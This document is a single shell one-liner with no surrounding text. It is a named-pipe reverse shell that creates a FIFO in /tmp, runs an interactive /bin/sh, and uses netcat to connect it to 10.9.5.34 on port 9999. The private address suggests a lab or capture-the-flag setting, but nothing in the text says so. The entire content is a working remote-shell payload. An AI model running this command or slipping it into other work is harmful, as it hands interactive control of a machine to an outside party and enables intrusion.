rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -ip 2>&1|nc 10.9.5.34 9999 >/tmp/f
